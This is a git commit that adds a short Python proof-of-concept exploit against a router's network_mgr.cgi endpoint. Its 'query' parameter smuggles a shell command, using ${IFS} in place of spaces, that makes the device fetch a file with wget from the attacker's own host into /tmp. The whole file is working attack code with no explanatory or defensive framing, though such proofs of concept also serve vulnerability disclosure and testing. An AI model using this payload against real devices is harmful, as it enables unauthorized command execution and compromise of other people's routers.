bff45da0e8374068d2ada379863d0100cb8670f8
longqx223 <19014781467@163.com>
2026-03-17 10:35:38 +0800

    Update network_mgr.cgi-cgi_dhcpd_lease.py

---
+++ network_mgr.cgi-cgi_dhcpd_lease.py
@@ -0,0 +1,29 @@
+import requests
+
+ROUTER_IP = "192.168.31.10"
+MY_IP = "192.168.31.215"
+MY_PORT = "8000"
+FILE_NAME = "hack.txt"
+
+def run_exploit():
+    target_url = f"http://{ROUTER_IP}:80/cgi-bin/network_mgr.cgi"
+    
+    wget_cmd = f"wget${{IFS}}http://{MY_IP}:{MY_PORT}/{FILE_NAME}${{IFS}}-O${{IFS}}/tmp/{FILE_NAME}"
+    final_payload = f"x;{wget_cmd};"
+    
+    params = {
+        'cmd': 'cgi_dhcpd_lease',
+        'page': '1',
+        'rp': '10',
+        'qtype': 'mac',
+        'query': final_payload,
+    }
+    
+    try:
+        requests.get(target_url, params=params, timeout=5)
+        print("[+] Exploit sent successfully!")
+    except Exception:
+        print("[+] Exploit sent (check server logs)!")
+
+if __name__ == "__main__":
+    run_exploit()、
